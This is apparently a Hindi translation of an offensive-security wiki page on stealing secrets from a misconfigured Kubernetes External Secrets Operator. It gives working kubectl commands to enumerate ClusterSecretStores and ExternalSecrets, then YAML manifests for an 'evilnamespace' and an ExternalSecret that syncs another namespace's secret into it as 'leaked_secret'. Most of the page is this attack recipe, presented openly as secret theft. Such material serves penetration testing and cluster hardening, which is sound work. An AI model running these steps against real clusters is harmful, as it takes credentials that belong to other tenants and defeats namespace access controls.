# External Secret Operator

**इस पृष्ठ के मूल लेखक हैं** [**Fares**](https://www.linkedin.com/in/fares-siala/)

यह पृष्ठ कुछ संकेत देता है कि आप कैसे एक गलत कॉन्फ़िगर किए गए ESO या एप्लिकेशन से रहस्यों को चुरा सकते हैं जो अपने रहस्यों को समन्वयित करने के लिए ESO का उपयोग करता है।

## अस्वीकरण

नीचे दिखाए गए तकनीक केवल तभी काम कर सकती है जब कुछ परिस्थितियाँ पूरी हों। उदाहरण के लिए, यह इस पर निर्भर करता है कि एक रहस्य को उस नामस्थान पर समन्वयित करने की अनुमति देने के लिए आवश्यकताएँ क्या हैं जो आप स्वामित्व में रखते हैं / समझौता कर चुके हैं। आपको इसे स्वयं पता करना होगा।

## पूर्वापेक्षाएँ

1. एक kubernetes / openshift क्लस्टर में एक पैर जमाना जिसमें एक नामस्थान पर प्रशासनिक विशेषाधिकार हो
2. क्लस्टर स्तर पर कम से कम ExternalSecret पर पढ़ने की पहुंच
3. यह पता करें कि क्या कोई आवश्यक लेबल / एनोटेशन या समूह सदस्यता की आवश्यकता है जो ESO को आपके रहस्य को समन्वयित करने की अनुमति देती है। यदि आप भाग्यशाली हैं, तो आप किसी भी परिभाषित रहस्य को स्वतंत्र रूप से चुरा सकते हैं।

### मौजूदा ClusterSecretStore के बारे में जानकारी इकट्ठा करना

मान लेते हैं कि आपके पास एक उपयोगकर्ता है जिसके पास इस संसाधन को पढ़ने के लिए पर्याप्त अधिकार हैं; पहले मौजूदा _**ClusterSecretStores**_ की सूची बनाकर शुरू करें।
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret enumeration

मान लीजिए कि आपने _**mystore**_ नाम का ClusterSecretStore पाया है। इसके संबंधित externalsecret की गणना जारी रखें।
```sh
kubectl get externalsecret -A | grep mystore
```
_यह संसाधन नामस्थान स्कोप किया गया है इसलिए जब तक आप पहले से नहीं जानते कि किस नामस्थान में देखना है, सभी नामस्थानों में देखने के लिए -A विकल्प जोड़ें।_

आपको परिभाषित externalsecret की एक सूची मिलनी चाहिए। मान लीजिए कि आपने _**mysecret**_ नाम का एक externalsecret ऑब्जेक्ट पाया है जो नामस्थान _**mynamespace**_ द्वारा परिभाषित और उपयोग किया गया है। यह जानने के लिए थोड़ी और जानकारी इकट्ठा करें कि यह किस प्रकार का रहस्य रखता है।
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Assembling the pieces

यहाँ से आप एक या एक से अधिक गुप्त नाम (जैसे कि Secret संसाधन में परिभाषित) प्राप्त कर सकते हैं। आपको एक आउटपुट मिलेगा जो इस प्रकार होगा:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
अब तक हमारे पास है:

- एक ClusterSecretStore का नाम
- एक ExternalSecret का नाम
- सीक्रेट का नाम

अब जब हमारे पास सब कुछ है, आप एक ExternalSecret बना सकते हैं (और अंततः आवश्यकताओं के अनुसार एक नया Namespace पैच/बनाने के लिए अपने नए सीक्रेट को सिंक करने के लिए):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
कुछ मिनटों के बाद, यदि समन्वय की शर्तें पूरी हो गईं, तो आप अपने नामस्थान के अंदर लीक किया गया रहस्य देख सकेंगे।
```sh
kubectl get secret leaked_secret -o yaml
```
## संदर्भ

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
